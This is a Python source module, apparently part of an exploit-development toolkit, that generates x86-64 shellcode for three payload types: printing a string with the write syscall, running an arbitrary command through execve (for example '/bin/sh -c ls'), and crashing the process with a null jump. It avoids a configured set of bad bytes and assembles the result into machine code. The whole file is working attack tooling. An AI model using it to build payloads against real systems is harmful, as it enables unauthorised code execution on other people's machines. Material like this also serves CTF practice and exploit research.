"""Shellcode generation for different types (write, execve, crash)."""

from .config import WORD_SIZE, BAD_BYTES

from .generate_shellcode_submodules.push_bytes import push_bytes
from .generate_shellcode_submodules.put_const_to_reg import put_const_to_reg

from .generate_shellcode_submodules.convert_asm_to_machine_code import convert_asm_to_machine_code

def count_pushes(code: list) -> int:
    """
    Count the number of `push` instructions in a list of assembly lines.

    Args:
        code: List of assembly instruction strings.

    Returns:
        Number of lines that start with "push".
    """
    pushes_count = 0
    for line in code:
        if line.startswith("push"):
            pushes_count += 1
    return pushes_count

def null_terminate(data: bytes) -> bytes:
    """
    Ensure a byte sequence ends with a null byte ('\0').

    If the sequence does not already end with '\0', a null byte is appended.

    Args:
        data: Input byte sequence.

    Returns:
        Null‑terminated byte sequence.
    """
    if not data.endswith(b'\0'):
        data += b'\0'
    return data

def generate_write_asm(data: str) -> list:
    """
    Generate assembly code that prints a string to stdout using the write syscall.

    The generated code pushes the string onto the stack, sets up the write syscall
    (syscall number 1, stdout, pointer to the string, length), and invokes it.

    Args:
        data: The string to print.

    Returns:
        List of assembly instructions (strings).
    """
    asm = []
    bytes_data = data.encode()
    asm += push_bytes(bytes_data)  # Put string to stack

    # Prepare write syscall
    asm += put_const_to_reg(1, "rax", BAD_BYTES)  # write syscall number = 1
    asm += put_const_to_reg(1, "rdi", BAD_BYTES)  # 1 means stdout
    asm.append("mov %rsp, %rsi")  # Source is rsp, string is on the top of stack
    asm += put_const_to_reg(len(bytes_data), "rdx", BAD_BYTES)
    # Do syscall
    asm.append("syscall")

    # Pushes overwriting fix
    pushes_count = count_pushes(asm)
    asm.insert(0, f"add ${pushes_count * 8}, %rsp")

    return asm

def generate_execve_asm(data: str) -> list:
    """
    Generate assembly code that executes a command using the execve syscall.

    The command and its arguments are pushed onto the stack, and an array of
    argument pointers is built. The syscall number 59 is loaded, and execve is invoked.

    Args:
        data: Command and arguments, e.g., "/bin/sh -c ls".

    Returns:
        List of assembly instructions (strings).
    """
    asm = []
    program_path = data.split(" ")[0]
    args = data.split(" ")[1:]

    # 1. Setup base pointer
    asm.append("mov %rsp, %rbp")

    # 2. Put all the data on stack and save offsets
    # 2.1. Put program path argument to stack
    program_path_bytes = program_path.encode()
    # Null-terminate string if it isn't null-terminated:
    program_path_bytes = null_terminate(program_path_bytes)
    asm += push_bytes(program_path_bytes)
    pushes_count = count_pushes(asm)
    program_path_offset = pushes_count*WORD_SIZE  # Save offset

    # 2.2. Put all the program arguments to stack
    arg_offsets = []
    for arg in args[::-1]:  # Reversed because of calling convention
        arg = null_terminate(arg.encode())
        asm += push_bytes(arg)
        pushes_count = count_pushes(asm)
        offset = pushes_count*WORD_SIZE
        arg_offsets.append(offset)

    # 3. Prepare array
    asm += push_bytes(b'\0'*WORD_SIZE)  # Null-terminator for array
    # Push args addrs

    for arg_offset in arg_offsets:
        asm += [f"lea -0x{hex(arg_offset)[2:]}(%rbp), %rax", "push %rax"]
    asm += [f"lea -0x{hex(program_path_offset)[2:]}(%rbp), %rax", "push %rax"]

    # 4. Prepare arguments for syscall
    asm += put_const_to_reg(59, "rax", BAD_BYTES)  # 59 is execve syscall number
    asm += [f"lea -0x{hex(program_path_offset)[2:]}(%rbp), %rdi"]
    asm += ["mov %rsp, %rsi"]
    asm += put_const_to_reg(0, "rdx", BAD_BYTES)

    # Do syscall
    asm += ["syscall"]

    # Pushes overwriting fix
    pushes_count = count_pushes(asm)
    asm.insert(0, f"add ${pushes_count * 8}, %rsp")

    return asm

def generate_exit_asm() -> list:
    """
    Generate assembly code that gracefully exits the process.

    This function creates the necessary instructions to call the exit syscall
    (syscall number 60) with a return code of 0. It is typically appended after
    the main shellcode to ensure the program terminates cleanly rather than
    crashing after the shellcode finishes.

    Returns:
        List of assembly instructions (strings) implementing exit(0).
    """
    asm = []
    asm += put_const_to_reg(60, "rax", BAD_BYTES)  # exit syscall number = 60
    asm += put_const_to_reg(0, "rdi", BAD_BYTES)  # Put exitcode=0 to rdi
    # Do syscall
    asm.append("syscall")
    return asm

def generate_crash_asm() -> list:
    """
    Generate assembly code that causes a crash by jumping to a null pointer.

    Returns:
        List containing the instructions "xor %rax, %rax" and "jmp *%rax".
    """
    return [
        "xor %rax, %rax",
        "jmp *%rax"
    ]

def generate_shellcode_asm(shellcode_type: str, data: str) -> str:
    """
    Generate assembly code for the specified shellcode type.

    This function dispatches to the appropriate assembly generator
    (`generate_write_asm`, `generate_execve_asm`, or `generate_crash_asm`)
    and appends an exit syscall for non‑crash shellcodes.

    Args:
        shellcode_type: Type of shellcode to generate ("write", "execve", "crash").
        data: User‑provided string (required for "write" and "execve").

    Returns:
        String containing the full assembly code, ready to be assembled.

    Raises:
        RuntimeError: If an unknown shellcode type is provided.
    """
    asm = []

    if shellcode_type == "write":
        asm = generate_write_asm(data)
    elif shellcode_type == "execve":
        asm = generate_execve_asm(data)
    elif shellcode_type == "crash":
        asm = generate_crash_asm()
    else:
        raise RuntimeError(f"Unknown shellcode type: {shellcode_type}")

    if shellcode_type != "crash":
        asm += generate_exit_asm()

    return "\n".join(asm)

def generate_shellcode(shellcode_type: str, shellcode_data: str) -> bytes:
    asm = generate_shellcode_asm(shellcode_type, shellcode_data)
    machine_code = convert_asm_to_machine_code(asm)
    return machine_code
